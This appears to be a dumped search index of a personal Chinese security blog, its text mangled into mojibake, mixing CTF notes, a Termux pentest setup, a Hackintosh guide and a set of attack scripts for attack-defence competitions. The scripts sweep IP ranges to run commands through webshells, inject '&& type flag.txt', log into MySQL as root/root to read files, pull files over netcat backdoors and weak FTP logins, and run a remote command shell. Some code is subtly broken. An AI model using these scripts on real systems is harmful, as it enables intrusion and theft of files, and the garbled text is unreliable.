123.206.87.240:8002/webshell/shell.php äºŒè¯ä¸è¯´ç›´æ¥ä¸Šçˆ†ç ´Burp Suite è¾“å…¥ä¸Šå» GETåˆ°flag [ç®¡ç†å‘˜ç³»ç»Ÿ]------------------------------------------------------ æ‰“å¼€å‘ç°æ˜¯ä¸€ä¸ªç™»å…¥ç•Œé¢ã€‚å°è¯•ä½¿ç”¨SQLä¸‡èƒ½å¯†ç ç™»å…¥ å¤±è´¥äº†ã€‚IPè¢«ç¦æ­¢è®¿é—®ã€‚ äºæ˜¯æ‰“å¼€æŠ“åŒ…è½¯ä»¶åœ¨è¯·æ±‚å¤´ä¸Šæ·»åŠ ä¸Š**X-Forwarded-For 127.0.0.1** å†è¯•è¯•ä¸‡èƒ½å¯†ç  å¯†ç é”™è¯¯ã€‚é‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹çœ‹æºç F12 çœ‹åˆ°æºç ä¸­æœ‰ä¸€ä¸ªè¢«æ³¨é‡Šçš„base64çš„ç¼–ç ã€‚äºæ˜¯è§£å¯†å‡ºæ¥çœ‹æ˜¯test123é‚£ä¹ˆç”¨æˆ·åæ˜¯**adminå¯†ç æ˜¯test123** tips:ä¸å®šæ—¶æ›´æ–°ã€‚æ¯æ›´æ–°åä¸ªé¢˜ç›®","categories":[{"name":"CTF","slug":"CTF","permalink":"https://hu5k7.github.io/categories/CTF/"},{"name":"CTF-Web-Note","slug":"CTF/CTF-Web-Note","permalink":"https://hu5k7.github.io/categories/CTF/CTF-Web-Note/"}],"tags":[{"name":"CTF-Web-Note","slug":"CTF-Web-Note","permalink":"https://hu5k7.github.io/tags/CTF-Web-Note/"}]},{"title":"Termuxå®‰è£…ç¬”è®°","slug":"Termuxå®‰è£…","date":"2019-02-02T00:00:00.000Z","updated":"2020-07-10T05:32:37.243Z","comments":true,"path":"2019/02/02/Termuxå®‰è£…/","link":"","permalink":"https://hu5k7.github.io/2019/02/02/Termuxå®‰è£…/","excerpt":"0x00 ä»‹ç» ä¸ºäº†æ–¹ä¾¿,éšæ—¶éšåœ°èƒ½åšæ¸—é€æµ‹è¯•åˆå®‰è£…ä¸äº†NetHuterçš„æ—¶å€™åšå‡ºæ¥çš„æ•´ç†ã€‚ä¹Ÿä¸ºäº†æ–¹ä¾¿æˆ‘è‡ªå·±ä»¥ååˆ·ç³»ç»Ÿèƒ½åœ¨å®‰è£…å›æ¥ï¼Œå†™å†™ç¬”è®°","text":"0x00 ä»‹ç» ä¸ºäº†æ–¹ä¾¿,éšæ—¶éšåœ°èƒ½åšæ¸—é€æµ‹è¯•åˆå®‰è£…ä¸äº†NetHuterçš„æ—¶å€™åšå‡ºæ¥çš„æ•´ç†ã€‚ä¹Ÿä¸ºäº†æ–¹ä¾¿æˆ‘è‡ªå·±ä»¥ååˆ·ç³»ç»Ÿèƒ½åœ¨å®‰è£…å›æ¥ï¼Œå†™å†™ç¬”è®° ç§‘å­¦ä¸Šç½‘ åœ¨Githubä¸Šæœç´¢ShadowsocksR (https://github.com/shadowsocksr-backup/shadowsocksr-android/releases) èµ›é£ Termuxä¸‹è½½åœ°å€ Googleå•†åŸ(è¦å€ŸåŠ©ç§‘å­¦ä¸Šç½‘) é…·å®‰ Termuxæ›´æ”¹æº è‡ªåŠ¨æ›´æ¢æŒ‡ä»¤ sed -i 's@^\\(deb.*stable main\\)$@#\\1\\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux stable main@' $PREFIX/etc/apt/sources.list æ‰‹åŠ¨ä¿®æ”¹ â€‹ ç¼–è¾‘ $PREFIX/etc/apt/sources.list ä¿®æ”¹ä¸ºå¦‚ä¸‹å†…å®¹ # The termux repository mirror from TUNA: deb https://mirrors.tuna.tsinghua.edu.cn/termux stable main å¹¶æ›´æ–°pkg up / apt update ä¸¤ç§æ–¹æ³•å®‰è£…metasploit ä¸¤ç§æ–¹æ³•å®‰è£…metasploit ç¬¬ä¸€ç§ pkg install metasploit ä¸€è·¯é»˜è®¤å®‰è£… ç¬¬äºŒç§ apt install wget wget https://Auxilus.github.io/metasploit.sh sh metasploit.sh pkg install metasploit Termuxå®‰è£…ä¸€äº›Pythonå¿…è¦çš„åº“ pkg install python python-dev python2 python2-dev Termuxå®‰è£…ä¸€äº›å¸¸ç”¨çš„è¾…åŠ©å·¥å…· pkg install git curl ç¾åŒ–Termux oh-my-zshçš„å®‰è£… sh -c &quot;$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)&quot; ä¸€æ­¥åˆ°ä½ï¼Œåé¢è‡ªå·±é€‰æ‹©ä¸»é¢˜å’Œé¢œè‰² Termuxå®‰è£…nmap pkg install nmap Termuxå®‰è£…SQLMap apt install python2 git git clone https://github.com/sqlmapproject/sqlmap è½¬è½½è¯·æ ‡æ˜å‡ºå¤„","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"ã€è½¬è½½ã€‘é»‘è‹¹æœå®‰è£…ç¬”è®°","slug":"BlackApple","date":"2018-12-15T00:00:00.000Z","updated":"2020-07-10T05:30:59.627Z","comments":true,"path":"2018/12/15/BlackApple/","link":"","permalink":"https://hu5k7.github.io/2018/12/15/BlackApple/","excerpt":"ä¸Šä¸ªæ˜ŸæœŸè£…çš„åŒç³»ç»Ÿ,win10 & MACOS,è¿˜æŠŠä¹‹å‰çš„win10æå´©äº†ã€‚å®³çš„æˆ‘åªèƒ½é‡è£…win10","text":"ä¸Šä¸ªæ˜ŸæœŸè£…çš„åŒç³»ç»Ÿ,win10 & MACOS,è¿˜æŠŠä¹‹å‰çš„win10æå´©äº†ã€‚å®³çš„æˆ‘åªèƒ½é‡è£…win10 æˆ‘è¦æ€»ç»“çš„è½¬è½½çš„ç®€ä¹¦éƒ½ã€‚ã€‚å¸®æˆ‘ä¸€èµ·æ€»ç»“äº†ï¼Œæ‰€ä»¥æˆ‘å°±æ‡’çš„å†™äº† å˜»å˜» è¦ç‚¹: 1ã€ä¸¤ç³»ç»Ÿå…±å­˜åˆ™ç£ç›˜å¿…é¡»æ˜¯GPTæ ¼å¼ 2ã€å®‰è£…macè¦ç”¨é€‚åˆæœºå‹çš„EFIæ–‡ä»¶å’Œç›¸åº”çš„å®‰è£…é…ç½®ï¼Œç‰¹åˆ«æ˜¯æ˜¾å¡é©±åŠ¨&lt;br&gt; 3ã€å®‰è£…å®Œä»¥åè¦æŠŠmacå’Œwinå®Œæ•´çš„EFIæ–‡ä»¶åˆå¹¶åˆ°ä¸€èµ·å¹¶ä¸”æ”¾å…¥ç”µè„‘å®‰è£…æ—¶è‡ªåŠ¨åˆ†å¥½çš„EFIåˆ†åŒºå†…&lt;br&gt; 4 ã€ç”¨cloveræŒ‚è½½å¥½æ‰€æœ‰çš„ç”µè„‘å†…EFIå¼•å¯¼æ–‡ä»¶ï¼ˆå³mac å’Œ winçš„ï¼‰ ç®€ç•¥æ­¥éª¤: è¿œæ™¯ï¼šä»GPT(GUID) åˆ†åŒºå¼€å§‹,EasyUEFI åŒç³»ç»Ÿå®‰è£…è¯¦è§£(install.wim + mac10.12.5)è¿™æ˜¯win7+mac10.12çš„å¸–å­ï¼Œæ¯”è¾ƒå¤æ‚ï¼Œå¯ä»¥çœ‹çœ‹ï¼Œäº†è§£EFIåˆ†åŒºã€‚win10+mac10.12 ç›´æ¥çœ‹12æ¥¼çš„å›å¤å°±å¯ä»¥äº†&lt;br&gt; åˆ†åŒºï¼šPEä¸‹åˆ†ä¸€ä¸ªESP ï¼ŒäºŒä¸ªNT&lt;br&gt; å®‰è£…MACï¼šuç›˜å®‰è£… å®‰è£…win10ï¼šPEä¸‹å®‰è£…WINçš„WIMé•œåƒï¼Œåœ¨è½¯ä»¶é‡Œé€‰å¯¹ç³»ç»Ÿåˆ†åŒºï¼Œå¯åŠ¨åˆ†åŒºï¼Œå¼•å¯¼ç±»å‹ EFIå¼•å¯¼ï¼šè£…å¥½WINåï¼ŒCOPY CLOVERè¿›ESPï¼Œå°±å®Œäº‹äº† æŠŠMac efié‡Œé¢CLOVERæ–‡ä»¶å¤¹æ”¾åˆ°espåˆ†åŒºçš„efiæ–‡ä»¶å¤¹é‡Œï¼Œç„¶åç”¨easyuefiæ·»åŠ EFI/CLOVER/CLOVERX64.efiå¼•å¯¼ åœ¨æ­¤ä¹‹å‰éœ€è¦çš„å‡†å¤‡ï¼š ç¡¬ä»¶æ–¹é¢ï¼š ä¸€å°i7-7700k + Gigabyte Z270X-Gaming5 å°å¼æœº æœ€å¥½æœ‰ä¸€å°å¯ç”¨çš„mac 2ä¸ªä»¥ä¸Šç©ºçš„8Gæˆ–ä»¥ä¸Šçš„Uç›˜ è½¯ä»¶æ–¹é¢ï¼š å‡†å¤‡å¥½mac 10.11.3é•œè±¡ å‡†å¤‡å¥½åœ¨winä¸Šåˆ¶ä½œmacé•œè±¡çš„å·¥å…·ï¼štransmac(è‡ªè¡Œç™¾åº¦ï¼‰æˆ–è€…macä¸Šåˆ¶ä½œmacé•œåƒçš„å·¥å…·ï¼šUnibeast å‡†å¤‡å¥½åœ¨macä¸ŠæŒ‚è½½EFIåˆ†åŒºçš„å·¥å…·ï¼šClover Configurator BIOSè®¾ç½®ï¼š å¯åŠ¨æ–¹å¼ï¼šUEFI ç¡¬ç›˜æ¨¡å¼ï¼šACHI å®¶ä¼™äº‹å‡†å¤‡å¾—å·®ä¸å¤šäº†æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹äº†ã€‚ ä¸€ã€é¦–å…ˆåˆ¶ä½œmacç³»ç»Ÿå®‰è£…ç›˜ 1 winç³»ç»Ÿï¼šåœ¨winé‡Œä¸‹è½½å¥½mac 10.12ç³»ç»Ÿå¹¶å®‰è£…å¥½transmac 2 Mac ç³»ç»Ÿï¼šä¸‹è½½macOS Sierra 10.12 å¹¶å®‰è£…Unibeastï¼Œåˆ¶ä½œmacå®‰è£…ç›˜ äºŒã€åˆ¶ä½œwin10ç³»ç»Ÿå®‰è£…ç›˜ ä¸‰ã€å®‰è£…macï¼Œæˆ‘ä»¬è¦å®ç°macå’Œwin10åŒæ—¶å­˜åœ¨ï¼Œå¹¶è¦åŒå¼•å¯¼ï¼Œæ‰€ä»¥å¿…é¡»è¦uefiå¼•å¯¼æ–¹å¼ï¼Œè€Œwin10è¦uefiå¼•å¯¼å°±å¿…é¡»è£…åœ¨GPTæ ¼å¼çš„ç£ç›˜ä¸Šï¼Œæ‰€ä»¥ï¼Œé¦–å…ˆï¼Œå¿…é¡»å°†ç£ç›˜è®¾ç½®ä¸ºGPTæ ¼å¼ï¼Œæ‰€ä»¥å…ˆç”¨win10çš„ç³»ç»Ÿç›˜æ’å…¥ç”µè„‘ï¼Œå¼€æœºï¼Œè¿›å…¥å®‰è£…ç•Œé¢ï¼Œåœ¨é€‰æ‹©è£…åœ¨å“ªä¸ªç›˜çš„æ—¶å€™ç‚¹å‡»shift F10ï¼Œç„¶ååœ¨dosé‡Œæ“ä½œï¼Œå…·ä½“æ“ä½œä¸å†æ­¤è¯´æ˜ è®¾ç½®ç£ç›˜æ ¼å¼ä¸ºGPTä»¥åï¼Œé€€å‡ºwindowså®‰è£…ï¼Œæˆ‘ä»¬å…ˆè¿˜æ˜¯å®‰è£…mac çš„ï¼ŒæŠŠæˆ‘ä»¬åšå¥½çš„macç³»ç»Ÿç›˜æ’å…¥ç”µè„‘ï¼Œå¼€æœºï¼ŒæŒ‰F7ï¼Œç”¨Uç›˜å¼•å¯¼ï¼Œé€‰æ‹©install OS X EI Capitan,æŒ‰ç…§æç¤ºä¸€æ­¥ä¸€æ­¥å®‰è£…å®Œæˆå³å¯ï¼Œå¤§æ¦‚20-25åˆ†é’Ÿï¼Œå–å†³äºä½ çš„Uç›˜é€Ÿåº¦ã€‚è¿™é‡Œæœ‰ä¸ªåˆ†åŒºçš„é—®é¢˜ï¼Œä½ æƒ³ç»™macå¤šå°‘ç©ºé—´ï¼Œå°±å¤šå°‘ï¼Œå…¶å®ƒçš„ä¸ç”¨åˆ›å»ºåˆ†åŒºï¼Œç­‰windowsåˆ›å»ºå³å¯ï¼Œæˆ‘128å›ºæ€ç»™mac40Gã€‚ä¹‹åmacå®‰è£…å®Œæˆ å››ã€å®‰è£…å®Œæˆåï¼Œå…³æœºï¼Œæ’å…¥ win7ç³»ç»Ÿç›˜ï¼ŒåŒæ ·UEFIå®‰è£…ç”¨Uç›˜å¼•å¯¼ï¼Œå®‰è£…åœ¨ssdå‰©ä¸‹çš„ç©ºé—´é‡Œï¼Œæ²¡æœ‰ä»€ä¹ˆå¥½è¯´çš„ã€‚&lt;br&gt;è¿™ä¸ªæ—¶å€™windowså’Œmacéƒ½å®‰è£…å¥½äº†ï¼Œä½†æ˜¯è¿™ä¸ªæ—¶å€™ä½ æ‹¨æ‰Uç›˜å¼€æœºä¼šå‘ç°ç›´æ¥è¿›å…¥äº†win10ç³»ç»Ÿï¼Œè¯´å¥½çš„é€‰æ‹©å‘¢ï¼Ÿ ä¸æ€¥ï¼Œæˆ‘ä»¬macçš„efiä¹Ÿè¿˜æ²¡æœ‰æ›¿æ¢å‘¢ã€‚ äº”ã€å¤„ç†ç”µè„‘EFIåˆ†åŒºï¼šé¦–å…ˆï¼Œç”¨Uç›˜å¼•å¯¼ï¼Œè¿›å…¥mac,åŒæ—¶ç”¨å·¥å…·æŒ‚è½½ç”µè„‘å’Œç³»ç»Ÿç›˜ä¸¤ä¸ªEFIåˆ†åŒºï¼Œå¹¶æŠŠEFIæ–‡ä»¶å¤¹åˆ é™¤ï¼ŒæŠŠæˆ‘ä»¬ä¸‹è½½å¥½çš„EFIæ–‡ä»¶å¤¹åˆ†åˆ«æ”¾è¿›å»ï¼Œä¸åšä½œä½•å¤„ç†ï¼Œå°±æ˜¯è¯´ç°åœ¨ç”µè„‘é‡Œæœ‰macéœ€è¦çš„é…ç½®ã€é©±åŠ¨ç­‰éƒ½æœ‰äº†ï¼Œå…³æœºï¼Œæ‹¨æ‰Uç›˜ï¼Œå¼€æœºï¼Œè¿›å…¥win10ç³»ç»Ÿï¼Œåœ¨win10ä¸‹åŒæ ·æŒ‚è½½ç”µè„‘EFIåˆ†åŒºï¼Œæ€ä¹ˆæŒ‚è½½å‘¢ï¼Ÿï¼Œ æ’å…¥win10çš„ç³»ç»Ÿç›˜ï¼ŒæŠŠé‡Œè¾¹çš„efiæ–‡ä»¶å¤¹é‡Œè¾¹çš„å†…å®¹æ›¿æ¢è¿›å»ï¼ˆæ³¨æ„æ˜¯å†…å®¹æ›¿æ¢ï¼Œä¸æ˜¯æŠŠåŸæ¥çš„efiåˆ é™¤ï¼ŒæŠŠè¿™ä¸ªæ”¾è¿›å»ï¼Œå› ä¸ºåŸæ¥çš„efié‡Œè¾¹å·²ç»æœ‰macçš„å¯åŠ¨æ–‡ä»¶äº†ï¼‰ æ›¿æ¢å®Œäº†åï¼Œå…³æœºï¼Œæ‹¨æ‰win10ç³»ç»Ÿç›˜ï¼Œæ’å…¥macç³»ç»Ÿç›˜ï¼Œå¼€æœºï¼ŒæŒ‰F7,ç”¨Uç›˜å¼•å¯¼ï¼Œåœ¨cloverç•Œé¢å…ˆæ‹© boot option ,å…ˆæ‹©ç¬¬ä¸€ä¸ªæŒ‚è½½æ‰€æœ‰å¼•å¯¼ï¼Œå¿˜äº†å…·ä½“æ˜¯ä»€ä¹ˆäº†ï¼Œå¤§æ¦‚æ˜¯è¿™ä¸ªæ„æ€ï¼Œå¦‚æœä½ å‘ç°å³ä¸‹è§’çš„cloverç‰ˆæœ¬å·å˜äº†ï¼Œå°±æˆåŠŸäº†ï¼Œè¿™ä¸ªæ—¶å€™restartï¼Œæ‹¨æ‰Uç›˜ï¼Œå¼€æœºåº”è¯¥è‡ªåŠ¨åˆ°cloveré€‰æ‹©ç•Œé¢ï¼Œå¯ä»¥é€‰æ‹©ä½œæ„ç³»ç»Ÿäº†ã€‚æ­¤æ—¶macå’Œwin10åŒå¼•å¯¼åŸºæœ¬å®Œæˆã€‚ æ¥ä¸‹æ¥å°±æ˜¯å®‰è£…å„ç§é©±åŠ¨å’Œå®Œå–„äº† å‚è€ƒ:https://www.jianshu.com/p/5db38511cc73","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"ä¸€å‘¨8ä¸ªç²¾é€‰æ–‡ç« :ç¬¬ä¸€ç« ","slug":"Daily01","date":"2018-12-05T00:00:00.000Z","updated":"2020-07-10T05:34:16.962Z","comments":true,"path":"2018/12/05/Daily01/","link":"","permalink":"https://hu5k7.github.io/2018/12/05/Daily01/","excerpt":"","text":"ä»å¤–ç½‘åˆ°å†…ç½‘çš„æ¸—é€å§¿åŠ¿åˆ†äº« : https://xz.aliyun.com/t/5330 åŸºäºEVE-NGå¹³å°ä¸Šæ„å»ºä¼ä¸šå†…ç½‘æ”»é˜²ç¯å¢ƒ : https://mp.weixin.qq.com/s/vBYxrmnBoM-Abl_y1v4DtA PHP å‡½æ•°æ¼æ´æ€»ç»“ : https://blog.csdn.net/qq_31481187/article/details/60968595 CTF Training ç»å…¸èµ›é¢˜å¤ç°ç¯å¢ƒ: https://github.com/CTFTraining/CTFTraining RemTeamæ”»å‡»æŠ€å·§å’Œå®‰å…¨é˜²å¾¡ : https://xz.aliyun.com/t/4602(https://evilwing.me/page/2/) ç›˜ç‚¹é‚£äº›æ¸—é€æµ‹è¯•ä¸­çš„å¥‡æ·«æŠ€å·§: https://paper.seebug.org/92/ APT34å·¥å…· :https://github.com/p3pperp0tts/APT34 CTFçº¿ä¸‹æ”»é˜²æŒ‡å— : http://blog.nsfocus.net/ctf-off-line-attack-defense-guidelines/ è½¬è½½è¯·æ ‡æ˜å‡ºå¤„","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"ã€PythonScriptã€‘:PyMySQL","slug":"Pythonè„šæœ¬PyMySQL","date":"2018-10-10T00:00:00.000Z","updated":"2020-07-10T05:32:09.421Z","comments":true,"path":"2018/10/10/Pythonè„šæœ¬PyMySQL/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Pythonè„šæœ¬PyMySQL/","excerpt":"0x00 ä»‹ç» çªç„¶æƒ³èµ·æ¥MYSQLæ˜¯å¦ä¹Ÿèƒ½åšæˆè‡ªåŠ¨GETFALGè„šæœ¬å‘¢ã€‚","text":"0x00 ä»‹ç» çªç„¶æƒ³èµ·æ¥MYSQLæ˜¯å¦ä¹Ÿèƒ½åšæˆè‡ªåŠ¨GETFALGè„šæœ¬å‘¢ã€‚ è¿™ä¸ªè¿˜æœ‰ç‚¹é—®é¢˜ã€‚å¯ä»¥è‡ªå·±ä¿®æ”¹ä¸‹:) import pymysql import threading file=open('MySQLsave.txt','w+') def mysql_login(i): ip='192.168.'+str(i)+'101' username='root' password='root' payload = &quot;SELECT load_file('C:/flag*.txt')&quot; try: db = pymysql.connect(ip,username,password,&quot;mysql&quot;) cursor = db.cursor() cursor.execute(payload) data = cursor.fetchall() print(data) except: pass for i in range(1,249): t = threading.Thread(target=mysql, args=(i,)) t.start() è½¬è½½è¯·æ ‡æ˜å‡ºå¤„","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"ã€PythonScriptã€‘:WebShell","slug":"Pythonè„šæœ¬WebShell","date":"2018-10-10T00:00:00.000Z","updated":"2020-07-10T05:34:53.780Z","comments":true,"path":"2018/10/10/Pythonè„šæœ¬WebShell/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Pythonè„šæœ¬WebShell/","excerpt":"&lt;&gt;","text":"&lt;&gt; import requests import threading flag = open(&quot;webshellsave.txt&quot;,&quot;a&quot;) def run(i): ip=&quot;192.168.&quot;+str(i)+&quot;.128&quot; url=&quot;http://&quot;+ip+&quot;/WebShell.php/&quot; payload={'cmd':'cat /root/flag*.txt'} try: r = requests.get(url,payload,timeout=1) flag.write(r.url+&quot;\\n&quot;+r.text) print(&quot;GET FLAG! &gt;&gt;&quot;,r.url,'\\n',r.text) except: print(&quot;\\nConnect Fail &gt;&gt;&quot;,url) for i in range(101,254): t = threading.Thread(target=run, args=(i,)) t.start() è½¬è½½è¯·æ ‡æ˜å‡ºå¤„","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"ã€PythonScriptã€‘:WebShell_urilb","slug":"Pythonè„šæœ¬WebShell_urilb","date":"2018-10-10T00:00:00.000Z","updated":"2020-07-10T05:34:40.012Z","comments":true,"path":"2018/10/10/Pythonè„šæœ¬WebShell_urilb/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Pythonè„šæœ¬WebShell_urilb/","excerpt":"0x00 ä»‹ç» ä½¿ç”¨urlilbæ¨¡å— åœ¨ä¸€äº›ç‰¹å®šçš„æ”»é˜²æ¯”èµ›ä¸­ï¼Œæ”»å‡»æœºæ²¡æœ‰å®‰è£…requestsæ¨¡å—ï¼Œåªèƒ½ä½¿ç”¨urlilbæ¨¡å—æ¥ä»£æ›¿","text":"0x00 ä»‹ç» ä½¿ç”¨urlilbæ¨¡å— åœ¨ä¸€äº›ç‰¹å®šçš„æ”»é˜²æ¯”èµ›ä¸­ï¼Œæ”»å‡»æœºæ²¡æœ‰å®‰è£…requestsæ¨¡å—ï¼Œåªèƒ½ä½¿ç”¨urlilbæ¨¡å—æ¥ä»£æ›¿ import urllib.parse import urllib.request import threading def WebShell(i): data = {&quot;dir&quot;: &quot;&amp;&amp; type flag.txt&quot;} url = &quot;http://192.168.123.&quot;+str(i)+&quot;/DirCtrl.php&quot; data_string=urllib.parse.urlencode(data) new_url=url+&quot;?&quot;+data_string try: send = urllib.request.urlopen(new_url,timeout=1) print(send.read().decode(&quot;utf8&quot;,&quot;ignore&quot;)) except: pass for i in range(1,255): t = threading.Thread(target=WebShell, args=(i, )) t.start() è½¬è½½è¯·æ ‡æ˜å‡ºå¤„","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"ã€PythonScriptã€‘:Web_Dirs_Scnnaer","slug":"Pythonè„šæœ¬Web_Dirs_Scanner","date":"2018-10-10T00:00:00.000Z","updated":"2020-07-10T05:32:15.973Z","comments":true,"path":"2018/10/10/Pythonè„šæœ¬Web_Dirs_Scanner/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Pythonè„šæœ¬Web_Dirs_Scanner/","excerpt":"0x00 ä»‹ç» çœ‹åˆ°ä¸€äº›webç›®å½•æ‰«æå™¨ã€‚è‡ªå·±ä¹Ÿå°è¯•å†™äº†ä¸€ä¸‹xD","text":"0x00 ä»‹ç» çœ‹åˆ°ä¸€äº›webç›®å½•æ‰«æå™¨ã€‚è‡ªå·±ä¹Ÿå°è¯•å†™äº†ä¸€ä¸‹xD import requests import random import re user_agent_list = [{'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'},] user_agent = random.choice(user_agent_list) target = input(&quot;target host &gt;&quot;) dict_path_file = input(&quot;dicr file &gt;&quot;) def CheckURLProtocol(): Check = re.match(r&quot;http?://&quot;,target) if Check == None: print(&quot;[-]Example: http://127.0.0.1 or https://127.0.0.1&quot;) exit(0) else: with open(dict_path_file) as f: for dic in f.readlines(): url = target + str(dic) url = url.replace(&quot;\\n&quot;,&quot;&quot;) try: r = requests.get(url,headers=user_agent) if r.status_code == 200: print(r.url) except: pass è½¬è½½è¯·æ ‡æ˜å‡ºå¤„","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"ã€PythonScriptã€‘:RemoteSocket_cmd","slug":"Pythonè„šæœ¬socket_cmdè¿æ¥","date":"2018-10-10T00:00:00.000Z","updated":"2020-07-10T05:32:12.934Z","comments":true,"path":"2018/10/10/Pythonè„šæœ¬socket_cmdè¿æ¥/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Pythonè„šæœ¬socket_cmdè¿æ¥/","excerpt":"0x00 ä»‹ç» ä¸ºäº†ç»™å­¦å¼Ÿä¸Šå…¬å¼€è¯¾åˆ»æ„å†™äº†ä¸€ä¸ªè¿œæ§è„šæœ¬ï¼Œè™½ç„¶ä¸è¿™ä¹ˆè¡ŒxD","text":"0x00 ä»‹ç» ä¸ºäº†ç»™å­¦å¼Ÿä¸Šå…¬å¼€è¯¾åˆ»æ„å†™äº†ä¸€ä¸ªè¿œæ§è„šæœ¬ï¼Œè™½ç„¶ä¸è¿™ä¹ˆè¡ŒxD Server: import socket,os def main(): global data, s s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind(('127.0.0.1',10001)) s.listen(5) print(&quot;ç­‰å¾…è¿æ¥ä¸­â€¦â€¦&quot;) while True: conn,addr = s.accept() while True: print('æ”¶åˆ°å‘½ä»¤') data = conn.recv(1024) cmd = os.popen(data.decode()) os_result = cmd.read() conn.sendall(os_result.encode('utf8')) if __name__ == '__main__': main() Client: import socket ServerIP=('127.0.0.1',10001) try: s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0) s.connect(ServerIP) print('[+]è¿æ¥æˆåŠŸ') except: print('[-]æœåŠ¡å™¨æ— å“åº”') exit(0) while True: data=input('[CMD]&gt;&gt;') s.sendto(bytes(data,encoding='utf8'),ServerIP) data = s.recv(1024) print('[+]å›æ˜¾æˆåŠŸ') print(data.decode()) è½¬è½½è¯·æ ‡æ˜å‡ºå¤„","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"ã€PythonScriptã€‘:PortScanner","slug":"Pythonè„šæœ¬ç«¯å£æ‰«æ(PortScanner)","date":"2018-10-10T00:00:00.000Z","updated":"2020-07-10T05:32:05.760Z","comments":true,"path":"2018/10/10/Pythonè„šæœ¬ç«¯å£æ‰«æ(PortScanner)/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Pythonè„šæœ¬ç«¯å£æ‰«æ(PortScanner)/","excerpt":"0x00 ä»‹ç» åœ¨å®è®­å®¤æ— èŠçš„æ—¶å€™ï¼Œéšæ‰‹å†™äº†ä¸€ä¸‹ç«¯å£æ‰«æçš„Pythonè„šæœ¬.","text":"0x00 ä»‹ç» åœ¨å®è®­å®¤æ— èŠçš„æ—¶å€™ï¼Œéšæ‰‹å†™äº†ä¸€ä¸‹ç«¯å£æ‰«æçš„Pythonè„šæœ¬. import socket import threading file=open(&quot;port.txt&quot;,'w+') def portscan(port): host='192.168.174.1' try: s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) conn=s.connect_ex((host,port)) if conn ==0: print(&quot;HOST &gt; {} : OPEN : {}&quot;.format(host,post)) file.write(host+&quot;:&quot;+str(post)+&quot;\\n&quot;) else: pass excpet: pass for port in range(1,65535): t=threading.Thread(target=portscan, args=(port, )) t.start() è½¬è½½è¯·æ ‡æ˜å‡ºå¤„","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"BashScripts","slug":"Shellè„šæœ¬","date":"2018-10-09T00:00:00.000Z","updated":"2020-07-10T05:32:25.770Z","comments":true,"path":"2018/10/09/Shellè„šæœ¬/","link":"","permalink":"https://hu5k7.github.io/2018/10/09/Shellè„šæœ¬/","excerpt":"0x00 ä»‹ç» æˆ‘åœ¨å…¨å›½èŒä¸šæŠ€èƒ½å¤§èµ›æ¯”èµ›æ—¶æ‰€ç”¨çš„shellè„šæœ¬:","text":"0x00 ä»‹ç» æˆ‘åœ¨å…¨å›½èŒä¸šæŠ€èƒ½å¤§èµ›æ¯”èµ›æ—¶æ‰€ç”¨çš„shellè„šæœ¬: ncåé—¨: port=10001 for i in `seq 101 254`; do ip=&quot;192.168.2.&quot;$i payload=`echo &quot;cat /root/flag*.txt;exit&quot; | nc $ip $port` done webshell: or i in `seq 101 254`; do ip=&quot;192.168.2.&quot;$i curl http://$ip/WebShell.php/?cmd=cat+%2Froot%2Fflag*.txt done ftp: username='admin' passwd='123456' for i in `seq 101 254`; do ip=&quot;192.168.2.&quot;$i sh ftpmain.sh $ip $username $passwd #é…åˆftpä½¿ç”¨ ftpmain: ftp $1 -inv user $2 $3 get /root/flag*.txt bye ! æœ‰ä¸€äº›åœ°æ–¹å¾—æ³¨æ„æ”¹åŠ¨ï¼Œä»€ä¹ˆIPåœ°å€NCåé—¨çš„ç«¯å£FTPé‚£è¾¹çš„å¼±ç”¨æˆ·å¼±å¯†ç ä»€ä¹ˆçš„ç­‰ç­‰â€¦ã€‚ å°¤å…¶æ˜¯ä¸€äº›æ ‡ç‚¹ç¬¦å·çš„å°ç»†èŠ‚ä¸èƒ½å¿˜è®°ï¼Œè¯¥ç©ºæ ¼çš„åœ°æ–¹å°±å¾—ç©ºæ ¼ï¼Œæœ€å¥½å…ˆå®éªŒä¸€éåœ¨æ‹¿å»å®æˆ˜ 